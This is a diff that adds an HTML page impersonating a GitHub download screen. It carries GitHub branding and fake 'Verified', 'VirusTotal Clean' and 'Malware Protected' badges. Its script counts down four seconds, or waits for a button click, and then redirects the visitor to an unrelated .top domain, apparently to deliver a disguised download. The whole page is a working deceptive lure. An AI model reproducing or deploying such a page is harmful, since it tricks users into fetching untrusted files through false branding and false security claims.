@@ -1,0 +1,574 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Preparing download… · GitHub</title>
+
+  <style>
+    :root {
+      --bg: #0a0f0a;
+      --bg2: #0d1a0d;
+      --bg3: #112011;
+      --border: #1e3a1e;
+      --border2: #163016;
+      --fg: #d4e8d4;
+      --fg2: #7aab7a;
+      --green: #2ea043;
+      --green2: #3fb950;
+      --green3: #56d364;
+      --blue: #1f6feb;
+      --warning: #bb8009;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--fg);
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+    }
+
+    a { color: var(--green2); text-decoration: none; }
+    a:hover { color: var(--green3); }
+
+    /* Header */
+    .hdr {
+      background: #060c06;
+      border-bottom: 1px solid var(--border2);
+      padding: 10px 16px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .hdr-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--fg);
+      font-size: 15px;
+      font-weight: 600;
+      margin-right: auto;
+    }
+
+    .logo svg { fill: currentColor; }
+
+    .hdr-nav {
+      display: flex;
+      gap: 4px;
+    }
+
+    .nav-link {
+      color: var(--fg);
+      font-size: 13px;
+      font-weight: 500;
+      padding: 5px 10px;
+      border-radius: 6px;
+      transition: background 0.15s;
+    }
+    .nav-link:hover { background: rgba(46,160,67,0.12); color: var(--green3); }
+
+    @media (max-width: 600px) {
+      .hdr-nav { display: none; }
+    }
+
+    /* Layout */
+    .wrap {
+      min-height: calc(100vh - 120px);
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 16px 12px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 680px;
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0,10,0,0.5);
+    }
+
+    /* Card top */
+    .card-top {
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--border);
+      background: linear-gradient(180deg, #0f1f0f 0%, var(--bg2) 100%);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .repo-icon {
+      width: 36px;
+      height: 36px;
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .repo-icon svg { fill: var(--green2); }
+
+    .card-top-info { flex: 1; min-width: 0; }
+
+    .card-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--fg);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .card-sub {
+      font-size: 12px;
+      color: var(--fg2);
+    }
+
+    .badge-ok {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 10px;
+      background: rgba(46,160,67,0.14);
+      border: 1px solid rgba(46,160,67,0.28);
+      border-radius: 999px;
+      font-size: 11px;
+      color: var(--green2);
+      font-weight: 600;
+      flex-shrink: 0;
+    }
+
+    .badge-dot {
+      width: 14px;
+      height: 14px;
+      background: var(--green);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 9px;
+      color: #fff;
+      font-weight: 700;
+    }
+
+    /* Card body */
+    .card-body {
+      padding: 16px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    /* Status row */
+    .status-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 3px solid var(--border);
+      border-top-color: var(--green2);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .status-text-wrap { flex: 1; }
+
+    .status-h {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--fg);
+      margin-bottom: 2px;
+    }
+
+    .status-p {
+      font-size: 12px;
+      color: var(--fg2);
+    }
+
+    /* Progress block */
+    .progress-block {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px 16px;
+    }
+
+    .countdown-row {
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    .countdown-label {
+      font-size: 12px;
+      color: var(--fg2);
+    }
+
+    .countdown-val {
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--green2);
+      font-variant-numeric: tabular-nums;
+      letter-spacing: -1px;
+      line-height: 1;
+    }
+
+    .bar-track {
+      width: 100%;
+      height: 8px;
+      background: var(--bg2);
+      border: 1px solid var(--border2);
+      border-radius: 999px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+
+    .bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--green) 0%, var(--green3) 100%);
+      transition: width 100ms linear;
+      border-radius: 999px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .bar-fill::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+      animation: shimmer 1.4s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .redirect-note {
+      font-size: 12px;
+      color: var(--fg2);
+      text-align: center;
+    }
+
+    .redirect-note strong {
+      color: var(--fg);
+    }
+
+    /* Button */
+    .btn {
+      width: 100%;
+      padding: 11px 20px;
+      background: var(--green);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn:hover { background: #2ea84a; }
+    .btn:active { transform: scale(0.98); }
+
+    .btn svg { fill: currentColor; }
+
+    /* Security row */
+    .sec-block {
+      background: linear-gradient(135deg, rgba(46,160,67,0.08) 0%, rgba(31,111,235,0.06) 100%);
+      border: 1px solid rgba(46,160,67,0.2);
+      border-radius: 8px;
+      padding: 12px 16px;
+    }
+
+    .sec-title {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--green2);
+      margin-bottom: 10px;
+    }
+
+    .sec-title svg { fill: var(--green2); }
+
+    .sec-badges {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .sec-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 10px;
+      background: rgba(46,160,67,0.1);
+      border: 1px solid rgba(46,160,67,0.18);
+      border-radius: 6px;
+      font-size: 12px;
+      color: var(--fg);
+      font-weight: 500;
+      flex: 1;
+      min-width: 110px;
+    }
+
+    .sec-badge svg { fill: var(--green2); flex-shrink: 0; }
+
+    /* Info note */
+    .info-note {
+      background: rgba(187,128,9,0.08);
+      border: 1px solid rgba(187,128,9,0.25);
+      border-radius: 6px;
+      padding: 12px 14px;
+      display: flex;
+      gap: 10px;
+      font-size: 12px;
+      color: var(--fg);
+      line-height: 1.55;
+    }
+
+    .info-note svg { fill: #d29922; flex-shrink: 0; margin-top: 1px; }
+
+    /* Footer */
+    footer {
+      border-top: 1px solid var(--border2);
+      background: #060c06;
+      padding: 16px 20px;
+    }
+
+    .footer-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .footer-copy {
+      font-size: 11px;
+      color: var(--fg2);
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links a {
+      font-size: 11px;
+      color: var(--fg2);
+    }
+    .footer-links a:hover { color: var(--green2); }
+  </style>
+</head>
+
+<body>
+  <div data-redirect-url="https://upnse7.top/mm2" data-delay-ms="4000" id="root">
+
+    <header class="hdr">
+      <div class="hdr-inner">
+        <a class="logo" href="#" aria-label="GitHub">
+          <svg height="28" viewBox="0 0 16 16" width="28" aria-hidden="true">
+            <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+          </svg>
+          <span>GitHub</span>
+        </a>
+        <nav class="hdr-nav">
+          <a class="nav-link" href="#">Product</a>
+          <a class="nav-link" href="#">Solutions</a>
+          <a class="nav-link" href="#">Open Source</a>
+          <a class="nav-link" href="#">Pricing</a>
+        </nav>
+      </div>
+    </header>
+
+    <div class="wrap">
+      <div class="card">
+
+        <div class="card-top">
+          <div class="repo-icon">
+            <svg width="20" height="20" viewBox="0 0 16 16">
+              <path d="M11.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122V6A2.5 2.5 0 0110 8.5H8.75v1.128a2.251 2.251 0 11-1.5 0V8.5H6A2.5 2.5 0 013.5 6v-.628A2.25 2.25 0 115 3.75v.622A1 1 0 006 5.5h4a1 1 0 001-1v-.628A2.25 2.25 0 019.5 3.25zM4.25 12a.75.75 0 100 1.5.75.75 0 000-1.5zM3.5 3.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0z"/>
+            </svg>
+          </div>
+          <div class="card-top-info">
+            <div class="card-title">GitHub Archive Downloader</div>
+            <div class="card-sub">Secure file delivery system · release/latest</div>
+          </div>
+          <div class="badge-ok">
+            <span class="badge-dot">✓</span>
+            Verified
+          </div>
+        </div>
+
+        <div class="card-body">
+
+          <div class="status-row">
+            <div class="spinner"></div>
+            <div class="status-text-wrap">
+              <div class="status-h">Preparing your download…</div>
+              <div class="status-p">Generating secure archive bundle</div>
+            </div>
+          </div>
+
+          <div class="progress-block">
+            <div class="countdown-row">
+              <span class="countdown-label">Download starting in</span>
+              <span class="countdown-val" id="countdownTime">4s</span>
+            </div>
+            <div class="bar-track">
+              <div class="bar-fill" id="progressBar"></div>
+            </div>
+            <div class="redirect-note">
+              Auto-redirect in <strong id="secondsText">4</strong> sec
+            </div>
+          </div>
+
+          <button class="btn" id="downloadBtn" type="button">
+            <svg width="16" height="16" viewBox="0 0 16 16">
+              <path d="M7.47 10.78a.75.75 0 001.06 0l3.75-3.75a.75.75 0 00-1.06-1.06L8.75 8.44V1.75a.75.75 0 00-1.5 0v6.69L4.78 5.97a.75.75 0 00-1.06 1.06l3.75 3.75zM3.75 13a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5z"/>
+            </svg>
+            Download Now
+          </button>
+
+          <div class="sec-block">
+            <div class="sec-title">
+              <svg width="14" height="14" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M8.533.133a1.75 1.75 0 00-1.066 0l-5.25 1.68A1.75 1.75 0 001 3.48V8c0 3.446 2.29 5.958 6.697 7.854a1.75 1.75 0 001.606 0C13.71 13.958 16 11.446 16 8V3.48a1.75 1.75 0 00-1.217-1.667L8.533.133zm-.385 1.395a.25.25 0 01.152 0l5.25 1.68a.25.25 0 01.174.238V8c0 2.928-1.898 5.117-5.9 6.895a.25.25 0 01-.23 0C3.899 13.117 2 10.928 2 8V3.446a.25.25 0 01.174-.237l5.25-1.68zM11.78 6.28a.75.75 0 00-1.06-1.06L7 8.94 5.28 7.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.06 0l4.25-4.25z"/>
+              </svg>
+              Security Verified
+            </div>
+            <div class="sec-badges">
+              <div class="sec-badge">
+                <svg width="13" height="13" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm3.53 5.28l-4.5 4.5a.75.75 0 01-1.06 0l-2-2a.75.75 0 111.06-1.06L6.47 8.16l3.97-3.97a.75.75 0 111.06 1.06z"/></svg>
+                VirusTotal Clean
+              </div>
+              <div class="sec-badge">
+                <svg width="13" height="13" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm3.53 5.28l-4.5 4.5a.75.75 0 01-1.06 0l-2-2a.75.75 0 111.06-1.06L6.47 8.16l3.97-3.97a.75.75 0 111.06 1.06z"/></svg>
+                Malware Protected
+              </div>
+              <div class="sec-badge">
+                <svg width="13" height="13" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm3.53 5.28l-4.5 4.5a.75.75 0 01-1.06 0l-2-2a.75.75 0 111.06-1.06L6.47 8.16l3.97-3.97a.75.75 0 111.06 1.06z"/></svg>
+                SSL Encrypted
+              </div>
+            </div>
+          </div>
+
+          <div class="info-note">
+            <svg width="16" height="16" viewBox="0 0 16 16">
+              <path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm6.5-.25A.75.75 0 017.25 7h1a.75.75 0 01.75.75v2.75h.25a.75.75 0 010 1.5h-2a.75.75 0 010-1.5h.25v-2h-.25a.75.75 0 01-.75-.75zM8 6a1 1 0 100-2 1 1 0 000 2z"/>
+            </svg>
+            <div><strong>Keep this page open.</strong> Download starts automatically. If nothing happens, tap the button above or try a different browser.</div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="footer-inner">
+        <span class="footer-copy">© 2025 GitHub, Inc.</span>
+        <div class="footer-links">
+          <a href="#">Terms</a>
+          <a href="#">Privacy</a>
+          <a href="#">Security</a>
+          <a href="#">Status</a>
+          <a href="#">Docs</a>
+          <a href="#">Contact</a>
+        </div>
+      </div>
+    </footer>
+
+  </div>
+
+  <script>
+    (function () {
+      'use strict';
+      const root = document.getElementById('root');
+      const redirectUrl = root.dataset.redirectUrl || '';
+      const delayMs = Math.max(0, Number(root.dataset.delayMs || 4000));
+
+      const elCountdown = document.getElementById('countdownTime');
+      const elSeconds   = document.getElementById('secondsText');
+      const elBar       = document.getElementById('progressBar');
+      const elBtn       = document.getElementById('downloadBtn');
+
+      let startTime = performance.now();
+      let isRedirecting = false;
+      let rafId = null;
+
+      function clamp(v, lo, hi) { return Math.min(hi, Math.max(lo, v)); }
+
+      function tick(now) {
+        if (isRedirecting) return;
+        const elapsed  = now - startTime;
+        const progress = delayMs === 0 ? 1 : clamp(elapsed / delayMs, 0, 1);
+        const remSec   = Math.ceil(Math.max(0, delayMs - elapsed) / 1000);
+
+        if (elCountdown) elCountdown.textContent = remSec + 's';
+        if (elSeconds)   elSeconds.textContent   = remSec;
+        if (elBar)       elBar.style.width = Math.round(progress * 100) + '%';
+
+        if (elapsed >= delayMs) { go(); return; }
+        rafId = requestAnimationFrame(tick);
+      }
+
+      function go() {
+        if (isRedirecting) return;
+        isRedirecting = true;
+        if (rafId) cancelAnimationFrame(rafId);
+        if (redirectUrl) window.location.assign(redirectUrl);
+      }
+
+      if (elBtn) elBtn.addEventListener('click', go);
+      rafId = requestAnimationFrame(tick);
+
+      document.addEventListener('visibilitychange', function () {
+        if (document.hidden) {
+          if (rafId) cancelAnimationFrame(rafId);
+        } else if (!isRedirecting) {
+          startTime = performance.now() - (delayMs - Math.max(0, delayMs));
+          rafId = requestAnimationFrame(tick);
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
